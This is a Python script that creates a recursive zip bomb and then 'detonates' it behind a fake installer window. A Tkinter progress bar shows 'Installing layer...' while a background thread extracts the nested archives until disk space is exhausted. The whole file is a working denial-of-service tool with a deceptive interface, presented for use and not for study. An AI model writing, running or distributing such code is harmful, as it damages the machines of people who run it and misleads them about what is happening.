import zlib
import zipfile
import shutil
import os
import sys
import time
import threading
import tkinter as tk
from tkinter import ttk

# -------- ZIP BOMB CREATION --------
def get_file_size(filename):
    st = os.stat(filename)
    return st.st_size

def generate_dummy_file(filename):
    with open(filename, 'wb') as f:
        f.write(b'\0' * 1024 * 1024)  # 1MB sparse null bytes

def get_filename_without_extension(name):
    return name[:name.rfind('.')]

def get_extension(name):
    return name[name.rfind('.')+1:]

def compress_file(infile, outfile):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64=True)
    zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)
    zf.close()

def make_copies_and_compress(infile, outfile, n_copies):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64=True)
    for i in range(n_copies):
        f_name = '%s-%d.%s' % (get_filename_without_extension(infile), i, get_extension(infile))
        shutil.copy(infile, f_name)
        zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
        os.remove(f_name)
    zf.close()

def create_zip_bomb(n_levels, out_zip_file):
    dummy_name = 'dummy.txt'
    generate_dummy_file(dummy_name)
    level_1_zip = '1.zip'
    compress_file(dummy_name, level_1_zip)
    os.remove(dummy_name)

    decompressed_size_mb = 1
    for i in range(1, n_levels + 1):
        make_copies_and_compress('%d.zip' % i, '%d.zip' % (i + 1), 10)
        decompressed_size_mb *= 10
        os.remove('%d.zip' % i)

    if os.path.isfile(out_zip_file):
        os.remove(out_zip_file)
    os.rename('%d.zip' % (n_levels + 1), out_zip_file)

# -------- EXTRACTION & GUI --------
def extract_all_recursive(base_dir):
    layer = 0
    while True:
        found = False
        for root, dirs, files in os.walk(base_dir):
            for file in files:
                if file.endswith(".zip"):
                    zip_path = os.path.join(root, file)
                    target_dir = os.path.join(root, file + "_unzipped")
                    try:
                        with zipfile.ZipFile(zip_path, 'r') as zf:
                            zf.extractall(target_dir)
                        os.remove(zip_path)
                        found = True
                    except Exception:
                        pass
        if not found:
            break
        layer += 1
        update_layer_progress(layer)

def update_layer_progress(current):
    percent = min(current * 20, 100)
    bar["value"] = percent
    label_var.set(f"Installing layer {current}...")
    root.update_idletasks()

def detonate_zip_bomb():
    os.makedirs("bomb_detonated", exist_ok=True)
    shutil.copy(bomb_filename, f"bomb_detonated/{bomb_filename}")
    extract_all_recursive("bomb_detonated")

def run_gui():
    global root, bar, label_var
    root = tk.Tk()
    root.title(f"Installer - {bomb_filename}")
    root.geometry("320x100")

    label_var = tk.StringVar()
    label_var.set("Starting installation...")
    ttk.Label(root, textvariable=label_var).pack(pady=10)

    bar = ttk.Progressbar(root, length=250, mode='determinate', maximum=100)
    bar.pack(pady=10)

    threading.Thread(target=detonate_zip_bomb, daemon=True).start()
    root.mainloop()

# -------- MAIN --------
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python combined.py n_levels bomb.zip")
        sys.exit(1)

    n_levels = int(sys.argv[1])
    bomb_filename = sys.argv[2]

    # Step 1: Create the zip bomb
    create_zip_bomb(n_levels, bomb_filename)

    # Step 2: Launch extraction GUI
    run_gui()
